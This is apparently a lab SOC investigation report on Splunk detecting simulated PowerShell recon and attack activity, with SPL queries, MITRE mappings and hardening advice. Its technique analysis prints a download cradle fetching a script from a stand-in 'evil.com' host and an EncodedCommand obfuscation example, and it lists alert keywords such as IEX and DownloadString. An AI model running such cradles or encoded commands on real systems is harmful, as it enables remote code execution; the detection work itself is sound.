# 🔍 Investigation Report — Suspicious PowerShell Activity Detected

## Overview

| Field | Details |
|---|---|
| **Date** | 30 April 2026 |
| **Analyst** | Jimil Joshi |
| **Hostname** | JIMIL-JOSHI |
| **Event ID** | 4104 — PowerShell Script Block Logging |
| **MITRE ATT&CK** | T1059.001 — PowerShell |
| **Severity** | High — Critical |
| **Status** | Investigated — Simulated Attack (Lab) |

---

## 1. Alert Description

Splunk detected multiple suspicious PowerShell events (Event ID 4104) on host `JIMIL-JOSHI` in two phases:

- **Phase 1 (Basic Detection):** 20 PowerShell recon events detected including `whoami`, `net user`, `Get-LocalUser`
- **Phase 2 (Advanced Threat Hunting):** 5 high risk PowerShell events detected including `New-Object Net.WebClient`, `Invoke-Expression`, and Base64 encoding techniques

---

## 2. PART 1 — Basic PowerShell Recon Detection

### Detection Query
```spl
index=main EventCode=4104
| table _time, ComputerName, Message
| sort -_time
```

### Commands Detected

| Time | Computer | Command | Risk |
|---|---|---|---|
| 11:02:51 | JIMIL-JOSHI | `net localgroup administrators` | 🔴 High |
| 11:02:48 | JIMIL-JOSHI | `Get-LocalUser` | 🟡 Medium |
| 11:02:47 | JIMIL-JOSHI | `Get-Process` | 🟡 Medium |
| 11:02:47 | JIMIL-JOSHI | `net user` | 🟡 Medium |
| 11:02:47 | JIMIL-JOSHI | `whoami` | 🟡 Medium |
| 11:02:47 | JIMIL-JOSHI | `ipconfig` | 🟡 Medium |

### Result
**20 PowerShell events** detected — classic attacker reconnaissance pattern confirmed.

---

## 3. PART 2 — Advanced Threat Hunting

### Detection Query
```spl
index=main EventCode=4104
| search Message="*Invoke*" OR Message="*WebClient*" OR Message="*ToBase64*" OR Message="*payload*" OR Message="*url*"
| table _time, ComputerName, Message
| sort -_time
```

### High Risk Commands Detected

| Time | Computer | Command | Attack Technique |
|---|---|---|---|
| 11:47:03 | JIMIL-JOSHI | `$client = New-Object Net.WebClient` | 🔴 Malware Download |
| 11:46:57 | JIMIL-JOSHI | `Invoke-Expression "whoami"` | 🔴 Code Execution |
| 11:46:50 | JIMIL-JOSHI | `$encoded = [Convert]::ToBase64String` | 🔴 Obfuscation |
| 11:46:43 | JIMIL-JOSHI | `Write-Host "Connecting to $url"` | 🟡 C2 Communication |

### Result
**5 high risk events** detected — advanced attacker techniques confirmed including download cradle, code execution and obfuscation.

---

## 4. Attack Technique Analysis

### `New-Object Net.WebClient`
- Used to download malicious payloads from internet
- Classic malware delivery technique
- Example: `(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')`
- **MITRE:** T1059.001

### `Invoke-Expression (IEX)`
- Executes strings as PowerShell commands
- Used to execute downloaded malicious code in memory
- Leaves minimal traces on disk
- **MITRE:** T1059.001

### `ToBase64String / FromBase64String`
- Used to obfuscate malicious commands
- Attackers encode payloads to bypass security tools
- Example: `powershell -EncodedCommand <base64>`
- **MITRE:** T1027 — Obfuscated Files or Information

---

## 5. MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|---|---|---|
| Execution | PowerShell | T1059.001 |
| Execution | Command and Scripting Interpreter | T1059 |
| Defense Evasion | Obfuscated Files or Information | T1027 |
| Discovery | Account Discovery | T1087 |
| Discovery | Local Account Discovery | T1087.001 |
| Discovery | Process Discovery | T1057 |
| Command and Control | Ingress Tool Transfer | T1105 |

---

## 6. Conclusion

Splunk successfully detected both basic reconnaissance commands and advanced attacker techniques in PowerShell logs. The threat hunting queries identified high risk patterns including download cradles, code execution and obfuscation — exactly what a real SOC analyst would hunt for in a compromised environment.

**Verdict: True Positive — Suspicious PowerShell Activity Detected ✅**

---

## 7. Recommendations

- Enable PowerShell Script Block Logging permanently on all endpoints
- Enable PowerShell **Constrained Language Mode** to block advanced techniques
- Alert on these keywords immediately:
  - `Invoke-Expression`, `IEX`, `Net.WebClient`, `DownloadString`
  - `FromBase64String`, `ToBase64String`, `bypass`, `EncodedCommand`
- Correlate with network logs — look for outbound connections after WebClient usage
- Consider **Application Whitelisting** to block unauthorized PowerShell scripts

---

## Screenshots

| Screenshot | Description |
|---|---|
| `screenshots/11_powershell_raw_events.png` | 20 raw Event ID 4104 events — Part 1 |
| `screenshots/12_powershell_commands_detected.png` | Recon commands detected — Part 1 |
| `screenshots/13_powershell_threat_hunt_raw.png` | 5 high risk events — Part 2 |
| `screenshots/14_powershell_threat_hunt_commands.png` | Advanced attack techniques detected — Part 2 |
